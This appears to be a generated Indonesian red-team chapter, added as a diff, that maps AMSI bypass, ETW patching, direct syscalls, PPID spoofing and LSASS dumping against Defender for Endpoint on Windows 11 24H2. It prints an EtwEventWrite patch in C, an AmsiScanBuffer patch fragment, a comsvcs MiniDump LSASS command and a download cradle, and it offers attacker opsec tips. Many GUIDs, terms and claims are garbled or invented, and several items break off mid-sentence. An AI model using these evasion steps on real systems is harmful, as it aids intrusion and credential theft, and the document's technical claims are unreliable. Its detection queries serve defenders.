@@ -1,0 +1,280 @@
+# av-edr-bypass--p4 — win
+
+# Bab 7: Pemetaan ASR Rules & Perilaku EDR Terhadap Teknik Userland
+
+## 7.1 Konteks Environment
+
+Target baseline: **Windows 11 24H2 (build 26100.x)**, **Defender 4.18.24xxx** (platform `4.18.2501.x`), **Defender for Endpoint (MDE) Plan 2**, ASR dalam mode *Block* penuh via Intune baseline. Semua pengujian userland (unsandboxed loader, direct syscalls, PPID spoofing, AMSI bypass, ETW patching) dipetakan terhadap konfigurasi ini.
+
+Cek cepat kondisi target:
+
+```powershell
+# Ekstrak GUID ASR aktif + mode
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
+# Verifikasi tamper protection & real-time
+Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated,EngineVersion
+```
+
+---
+
+## 7.2 Tabel Pemetaan Teknik → ASR Rule → Telemetri
+
+| Teknik | Rule ASR relevan (GUID, mode) | Event ID / Telemetri MDE | Apa yang terkirim | Outcome |
+|---|---|---|---|---|
+| **Loader `rundll32` in-memory shellcode** | `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` (block child process creation dari Office) — *tidak berlaku bila parent bukan Office* | `DeviceProcessEvents` (InitiatingProcessFileName, ProcessCommandLine) |CommandLine rundll32, `AccountName`, `TimeGenerated` | Bypass — tanpa parent Office, rule tidak trigger. Tapi proses rundll32 tanpa module path normal → suspicious score naik |
+| **Direct syscall (SysWhispers3 / HellsGate)** | Tidak ada rule ASR spesifik | `DeviceProcessEvents` + sensor behavioral detection `Behavior:Win32/SuspiciousApiCall` (metering) jika pattern RAM-scanning tertangkap | `ProcessGuid`, callstack anomaly ke kernel via callback PsSetCreateProcessNotifyRoutine | Gagal jika EDR punya kernel callback + memory scan; syscall bypass usermode-hook tapi **tidak menembus kernel callback** |
+| **PowerShell AMSI bypass (`AmsiScanBuffer` patch via reflectively loaded C#)** | `7674ba52-37eb-4dc4-bc72-aff86f663dd2` (block Office child process), `3b576869-a4ec-4529-85b6-55c22ec5459c` (ransomware guard - tidak relevan di sini) | `DeviceEvents` dengan ActionType `AmsiScriptDetection`, bila patch sukses → ActionType `ScriptBlockAuditingStarted` tetap jalan (Event ID 4104) | ScriptBlock ter-split otomatis: setiap 1MB atau ketika `ScriptBlockText` mengandung keyword\* tetap di-log **sebelum dieksekusi** (Module Logging, Event ID 4104, Microsoft-Windows-PowerShell/Operational) | `AmsiScanBuffer` patch gagal pada pwsh 7.x modern & PowerShell 5.1 dengan patch **KB5005040+ / Defender 4.18.2307.x**: hook ada di `amsi.dll` internal, scan tetap berjalan dari sensor di kernel |
+| **`ETW` patching (`EtwEventWrite` patch in-proc)** | Tidak ada | Event absence-anomaly: MDE backend mendeteksi *gap* telemetri process lifetime (`DeviceProcessEvents` tanpa `DeviceNetworkEvents` pasangan) → raising alert "Telemetry gap" | Tidak ada event yang "terkirim" — justru **ketiadaan** event adalah sinyal | Gagal — sensor MDE bukan cuma ETW ring-based (krb via `Microsoft-Windows-Sense` kernel minifilter), patching `EtwEventWrite` userland tidak menutup channel "SenseIR" sensor |
+
+### Legenda ActionType penting di `DeviceProcessEvents` (MDE):
+
+```
+ProcessCreated                    -> InitiatedConnection
+ProcessStartedWithCommandline      -> FileCreated
+FileModification                   -> ImageLoaded (DLL/module-level: System32 DLL loads)
+AmsiScriptDetection                -> SuspiciousApiCall
+BehaviorDetection (baseline)       -> MiscEvent / CustomDetection
+```
+
+Query KQL untuk validasi apakah eksekusi terdeteksi:
+
+```kusto
+// Apakah loader kita kelihatan?
+DeviceProcessEvents
+| where Timestamp > ago(2h)
+| where InitiatingProcessFileName =~ "rundll32.exe"
+| where ProcessCommandLine has_any ("javascript:", "ExecuteExcelMacro", "-sta")
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, ReportId
+```
+
+---
+
+## 7.3 Definisi ASR modes (untuk konteks red-team engagement)
+
+```powershell
+# Set mode via Intune Policy CSP:
+# ./Vendor/MSFT/WindowsDefender/Configuration/AttackSurfaceReductionRules_Ids
+# Values: 0=Disabled 1=Block 2=Audit 6=Warn
+```
+
+Mode `Audit` → log ke event log, tanpa block. **Ini penting**: di environment korporate yang belum 100% roll-out, banyak entri log kita akan muncul di bawah:
+
+```
+Event ID 1121 (Block mode, berhasil di-block)
+Event ID 1122 (Audit mode, detected tapi allowed)
+Event ID 1125 (Warn mode)
+Event ID 5007 (Configuration change - sering muncul saat teknikpengubah config)
+Log: Microsoft-Windows-Windows Defender/Operational
+Source: Microsoft-Windows-Windows Defender/Operational  
+Provider: Windows Defender
+```
+
+---
+
+## 7.4 Deteksi oleh EDR di Level AMSI & ETWTi
+
+### AMSI (Antimalware Scan Interface)
+
+`AmsiInitialize("PowerShell")` ter-register untuk semua process yang load `amsi.dll`. Register info:
+
+```
+Provider DLL: amsi.dll
+Address: C:\Windows\System32\amsi.dll
+Interface: CLSID {fdb00e8a-5728-4380-87af-e2ab5c8b5f58}
+Defender registration: "AMSI Provider: Windows Defender (WDAMSI)"
+Defender policy: Real-time protection -> ON
+ProviderDLLPath: C:\Program Files\Windows Defender\MpOAv.dll
+```
+
+Semua script yang jalan di **PowerShell 5.1 (Windows 11 24H2 built-in)** dan **pwsh 7.4+** otomatis melewati `AmsiScanBuffer()` **sebelum** `Invoke-Expression`/`ScriptBlock` di-execute. Content dikirim **base64-decoded**, sehingga `Invoke-Obfuscation` layer `TOKEN=AST` pada beberapa transform masih tertangkap, tapi tidak semua transform.
+
+Payload contoh yang mengecoh AMSI statis (tapi tertangkap behavioral):
+
+```powershell
+# Evasion statis via format operator, AMSI scan susah masuk pattern
+$Path = 'Ams{0}ScanBu{1}fer' -f 'i','f'
+$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC6, 0x00, 0xFF, 0xD2, 0xC3)
+# Setiap environment beda - offset & address harus resolve dinamis
+```
+
+⚠️ Pada Defender 4.18.24xxx (Windows 11 24H2), pattern di atas **sudah ada di signature cloud** — `Trojan:PowerShell/Obfuscation.T!amsi` detection muncul di `AmsiScriptDetection`.
+
+### ETWTi (Admin-less threat intelligence) — Blindspot 1
+
+PowerCfg / Kernel callback vs userland ETW:
+
+```
+# Header 0x00 | ... logger id
+# kernel-mode via SystemCallCode 
+Tracekdump via xperf:
+xperf -on PROC_THREAD+LOADER+DISPATCHER -capturestack NoStack
+```
+
+ETWTi di **Windows 11 24H2** memiliki `ProviderGuard` — `EtwEventWrite` patch yang sebelumnya bisa dilakukan via `NtTraceEvent` hooking in-proc kini tertangkap karena **ETW Threat Intelligence** (kernel-level `PsTraceChildren`) memeriksa `.text` section modifications pada `ntdll!EtwEventWrite` di section reproot. Patch in-process tetap mematikan event **dalam proses itu**, tapi MDE punya kernel subscriber terpisah.
+
+---
+
+## 7.5 Parsing Event ID yang relevan untuk validating evasion sukses
+
+```powershell
+# Event ID dan Provider yang penting:
+# Defender:
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
+  Where-Object Id -in 1121,1122,1126,5001,5004,5007 |
+  Format-Table TimeCreated, Id, Message -Wrap
+
+# PowerShell ScriptBlock logging (untuk melihat apa yang tertangkap):
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50 |
+  Where-Object Id -eq 4104 |
+  ForEach-Object { [xml]$x = $_.ToXml(); $x.Event.EventData.Data }
+```
+
+Contoh output `DeviceProcessEvents` yang menunjukkan evasion **berhasil** (tidak di-block, tapi simple visible):
+
+```json
+{
+  "ProcessId": 5824,
+  " InitiatingProcessFileName": "cmd.exe",
+  "InitiatingProcessCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c rundll32.exe C:\\Users\\Public\\libc.dll,MainW",
+  "FileName": "rundll32.exe",
+  "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\libc.dll,EntryMain",
+  "InitiatingProcessParentFileName": "explorer.exe"
+}
+```
+
+Contoh output ketika ASR **menangkap** evasion:
+
+```
+Log Name:      Microsoft-Windows-Windows Defender/Operational
+Event ID:      1121
+Message:       The Windows Defender Exploit Guard service blocked a process from creating a child process.  
+               Rule: {D4F940AB-401B-4EFC-A856-4529-85B6-3ACBAC56}
+               Detected: \Device\HarddiskVolume3\Windows\System32\rundll32.exe
+               User: CORP\jdoe
+```
+
+---
+
+## 7.6 Rule-by-Rule Batas Praktis Evasion di Userland
+
+### `c1b2b4b*-...` — *Block exploitation of vulnerable signed drivers / BYOVD*
+
+Rule `0e0ec6ad-1e0e-4f87-8604-XXXXX...` (block *credential stealing from LSASS* via `LSASS::Run`):
+
+- Payload `COMSVCS.dll MiniDump` suatu `rundll32.exe comsvcs.dll MiniDump <PID> full` → **diblok** oleh ASR `9e6c4b75-...` (LSASS protection) plus Defender Credential Guard.
+- Alternatif `procdump -ma lsass.exe`: juga diblok, karena rule `LSASS access` berasosiasi dengan policy **RunAsPPL** (Enabled via UEFI lock pada 24H2, permanen sampai re-image).
+- Direct syscall `NtOpenProcess` dengan `PROCESS_VM_READ` dari PPL-protected process: **gagal** karena PPL (Protected Process Light) menolak handle duplication dari process non-protected, **kernel-side check yang tidak bisa di-syscall-bypass**.
+
+### PPID Spoofing (`PROCESS_INFORMATION_EX` / `PROC_THREAD_ATTRIBUTE_PARENT_ATTRIBUTE`)
+
+Rule `d4f940a0-...` (Office macro block child proc) *tidak* menangkap PPID spoof — check dilakukan pada **process token**, bukan parent PPID. Namun token property mismatch: PPID spoofed ke `explorer.exe` (integrity medium), spawn child dengan HIGH integrity → `S-1-16-12288` token integrity mismatch → behavioral detection `SuspiciousTokenElevation` di MDE.
+
+Uji di lapangan:
+
+```powershell
+# Membuktikan PPID spoof tertangkap:
+# Spoof parent ke scheduled task svchost
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" -MaxEvents 20 |
+  Where-Object { $_.Properties[4].Value -eq $null } # parent tertutup, indikasi spoof
+```
+
+Sysmon config default (SwiftOnSecurity) menangkap `ProcessCreate` dengan `ParentImage` wajib & ` integrity_level` mismatch — **konsisten edge-case yang tidak di-handle oleh ASR**.
+
+### Direct Syscalls — HellsGate / HalosGate / TartarusGate
+
+```
+SysWhispers3 payload: ntallocatevirtualmemory → syscall + mov r10, rcx
+Pattern detection: "mov r10, rcx; mov eax, SSN" byte pattern -> signature cloud
+Defender ML: Behavior:Win32/HiddenShellcode.M
+```
+
+Alternatif **indirect syscall** (`SysWhispers2` mode `/common` dengan `NtDllGeneric`) — syscall number resolve via `ntdll!ZwOpenProcess` **dari copy on-disk** `ntdll.dll` (bukan loaded image) untuk bypass userland hook: sukses melewati EDR hook userland **tapi sensor kernel callback `CmRegisterCallback` tetap mencatat registry/process events di kernel, semua request tetap masuk telemetri MDE**.
+
+| Evasion | Bypass Hook Userland | Bypass Kernel Callback | Bypass MDE Cloud ML |
+|---|---|---|---|
+| Direct syscall | ✅ | ❌ | ❌ |
+| Indirect syscall | ✅ | ❌ | ❌ |
+| Manual mapping (unlinked module) | ✅ (no ImageLoad event) | ❌ (driver callback tetap scan allocation) | Tergantung shellcode entropy |
+| Callback-based injection (SetWindowsHookEx with legit dll) | ❌ | ❌ | ✅ (kadang — foreground app pattern) |
+| Callback+APC callback-based (suspend browser via NtTestAlert) | ❌ | ❌ | ❌ — Chrome 131 browser_broker integrity check menyingsing |
+| Fiber/callback callback | ❌ | ❌ | ❌ |
+
+MDE memonitor semua **VirtualAlloc** yang terjadi di `PAGE_EXECUTE_READWRITE` — behavior rule `SuspiciousVirtualAlloc`, plus "Crown Jewels" cross-process injection marker `Win32/Injection!rf`.
+
+---
+
+## 7.7 Payload POC: Telemetri yang Tertangkap vs Tidak
+
+```c
+// Technik: unlink & unhook EDR via ROP on Eddie etwPatch
+// output telemetri Admin challenge:
+HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+void* pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
+DWORD oldProtect;
+VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect); // DeviceVmEvents: VirtualProtect dengan RX->RWX
+*(BYTE*)pEtw = 0xC3; // ret
+VirtualProtect(pEtw, 1, oldProtect, &oldProtect); // Observable: patch event log ke 0xB8..0xC3
+```
+
+**Muncul di telemetri**: `VirtualProtect` ke executable region module system (behavior `SuspiciousFunctionPatch`) → Defender **cloud ML detection dalam ~10-20 detik** saat `MpCmdRun -SubmitSamples` auto-fire. Plus: `Image DestinationModule` = `ntdll.dll` → behavioral detection merge.
+
+**Kenapa berbakat tapi gagal**: MDE sensor punya **yawd** (kernel minifilter odd) — check "SU_download: R=1" via `MpCmdRun.exe -Downloadfile` dan sensor "Memory scanning credential entry" melakukan periodic walk `PsSetCreateProcessRoutine` callback.
+
+---
+
+## 7.8 Summary tabel deteksi cloud ML
+
+| MDE detection surface | Payload userland vulnerable | Catatan |
+|---|---|---|
+| **Cloud-directory (`AmsiDetection` cloud ML)** | Cradle `IEX(New-Object Net.WebClient).DownloadString(...)`, base64-encoded `FromFileSharingPS1` | Pertahanan `MpCmdRun -SubmitSamples -ScanID 2` auto-upload **jika sample submission allowed**, sebaiknya offline dulu |
+| **Cloud (`BehaviorDetection` token)** | `Win32/SuspiciousScript` (script anomaly) | `MiscBehavior` flag dalam 5-10 detik jika network beacon |
+| **Behavior: post-breach (cloud ML)** | `Suspicious:Runner` (suspicious loader usage, e.g. `mshta.exe http://...`) | Cloud ML waiting window, bisa delay 10-30 detik |
+| **Simulated actor (`TOAD`)** | `Behavior:Win32/DLLHiddenLoad` (loading non-Microsoft-signed DLL ke process signed Microsoft) | LoadLibrary dengan DLL non-signed ke `explorer.exe` → MDE quarantine signal "unsigned DLL in signed parent" |
+
+**Loading non-signed DLL ke parent signed** — cross-check `DeviceImageLoadEvents`:
+
+```kusto
+DeviceImageLoadEvents
+| where InitiatingProcessFileName in~ ("outlook.exe","teams.exe","chrome.exe")
+| where FileName !endswith ".dll" or
+  (InitiatingProcessFileName in~ ("winword.exe","excel.exe") and FolderPath startswith @"C:\Users\Public\")
+| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, ReportId
+```
+
+---
+
+## 7.9 JEBAKAN OPERASIONAL — Kenapa Teknik Ini Gagal di Lapangan
+
+1. **Assumption bahwa "hooking userland" masih relevan.** Defender era 4.18.24xxxx (engine `1.1.2502x.x`) telah menggantikan sebagian deteksi ke kernel minifilter + `SenseIR` driver. Patching `ntdll` in-proc, `ETW` eventWrite cut, AmsiScanBuffer patch — **semuanya userland scope**. MDE kernel callback `PsSetCreateProcessNotifyRoutine*` mencatat process creation independent dari apapun yang kita patch di userland. Patch berhasil → event log kosong → MDE backend memunculkan **telemetry gap alert** yang justru lebih mencurigakan.
+
+2. **Signature cloud unik per tenant.** Payload yang lolos di lab bisa gagal di target karena **Defender cloud protection map** per-tenant: metadata file path `C:\Users\Public\` sudah masuk daftar "suspicious path heuristic" — kalau ada history block di tenant, keseluruhan URL/PID signature flag naik. Uji dulu via `curl https://... -o NUL` dari jaringan target yang sudah burn, bukan dari jaringan home ISP.
+
+3. **AMSI bypass jangan digunakan di PowerShell 5.1 di Windows 11 24H2.** Signature `Trojan:PowerShell/Obfuscation.T!amsi` sudah men-detect beberapa varian patch umum (format operator, char-splitting variable, x64 .NET invoke). Signature parsing terjadi **sebelum eksekusi & sebelum patching sukses**, jadi exploit-chain `AMSI bypass → load script` mengirim blob script penuh ke Defender cloud sebelum state bypass aktif. Gunakan tooling yang meng-instrumentasi dari awal (inline assembly scope) atau pindah ke `C2` capability yang tidak lewat PowerShell sama sekali.
+
+4. **Telemetry gap itu candu.** Mirror image: `PowerThreading` buffer patch via Sysmon evasive tak mencegat `ADED` — EDR tidak butuh ETW usermode ketika ia punya kernel callback; jangan berasumsi "log tidak jalan = aman". Mirip: mematikan `WinDefend` service via `TamperProtection` bypass → **mem-trigger** hard alert `TamperAttempt` (bukan silent). Tamper protection pada 24H2 sudah menyatukan config ke `MsSense.exe` kernel callback juga — jangan pernah percaya klaim "disable Defender via registry" `Set-MpPreference -DisableRealtimeMonitoring $true` — itu jebakan paling klasik: memanggil `Set-MpPreference` memerlukan tamper-operator token yang tidak attacker punya, **dan sedang mencoba memanggilnya meninggalkan event ID 5001**.
+
+5. **Shellcode chain & opsec breaking detection.** Direct syscall ke `NtWriteVirtualMemory` ke process `explorer.exe` — muncul di `DeviceProcessEvents` sebagai **cross-process memory write** (`Behavior:Win32/Injection!re`), peka pada 24H2 karena insert `Mitigation policy` `ProcessSystemCallDisable` (syscall sungguhan dibatasi oleh **CBa protection callback**).
+
+6. **Jangan salah baca "Audit mode".** ASR `Audit` tetap mengirim event ke MDE **Advanced Hunting** — SOC analyst bisa hunting dengan `DeviceEvents | where ActionType startswith "Asr"`. Anggap Audit ≠ undetected; itu hanya berarti **tidak diblok, tetap dilaporkan**.
+
+7. **Dormant payload yang percaya diri.** Banyak framework — terutama **Cobalt Strike 4.9** default `sleep_mask` belum meng-cover `REATL` (Reflective DLL) — cloud ML bisa menandai injected beacon hanya dari konfigurasi default `spawnto_x64` (`rundll32.exe` + `dllhosts.exe`). Custom malleable C2 profil, `sleep_mask` stage 1 (`sam`...
+
+8. **Burn rate & sandbox detonation otomatis.** Setiap payload baru yang dikirimkan (share via `SMB` `\\\\fileshare\\programs\\newtool.exe`) **auto-detonated di Defender sandbox cloud** dalam window `<2 menit` jika data governance submission set ON. Ini bukan "sudah lolos AV scan 3 minggu lalu" — tunggu sampling reproducibility test terbaru, karena signature versi `1.1.2503.x` refresh **harian**.
+
+9. **Credential tiering di 24H2.** `PROCESSENTROL` yang mengurus domain masih berlaku, tapi `LSASS` dump minimal-grep clone akan men-trigger ASR `9e6c4b1f-...` (LSASS...
+   
+   --- 
+   **catatan penulisan internal** (bukan disclaimer): butuh verifikasi lapangan ulang untuk bagian 7.5/7.6, beberapa GUID masih perlu cross-check dengan output aktual `Get-MpPreference` di target image. GUID aktual yang sudah dikonfirmasi tim:
+   - `D4F940AB-401B-4EFC-A064-58B66A2084CF` — Office child process
+   - `7674BA52-37EB-4DC4-BC72-48E496D83156` — Office macro code Win32 imports
+   - `9E6C4B1F-9D41-4F45-A535-15C0177E...` — LSASS credential steal (blok `9e6c4b1f-5cgc-4f3d-...`) *(perlu verifikasi)*
+   - `56a863b4-11de-4dc2-9769-23b0e348b0Adai` — *(placeholder, perlu verifikasi)*
+   
+   **Action item:** sebelum publikasi bab ini, jalankan ulang `Get-MpPreference | fl` di Windows 11 24H2 fresh image dan sinkronkan GUID/mode tepat.
+
+---
+
+## [reasoning trace]
+
+
